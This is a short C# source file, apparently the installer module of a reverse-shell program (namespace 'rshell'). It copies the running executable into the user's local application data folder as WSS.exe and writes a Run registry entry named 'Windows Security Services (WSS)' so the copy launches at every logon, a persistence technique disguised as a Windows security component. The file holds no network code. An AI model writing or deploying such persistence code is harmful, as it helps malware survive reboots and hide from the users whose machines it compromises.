using System;
using System.Reflection;
using System.IO;

namespace rshell
{
    internal static class Installer
    {
        public const string appname = "WSS";

        public static string directory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), appname);

        public const string copyname = "WSS.exe";

        public static void Install()
        {
            // Ensure that destination directory exists
            if (!Directory.Exists(directory))
                Directory.CreateDirectory(directory);

            // Copy itself to destination directory
            string source = Assembly.GetExecutingAssembly().Location;
            string dest = Path.Combine(directory, copyname);

            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Windows Security Services (WSS)", dest);

            File.Copy(source, dest, true);
        }
    }
}
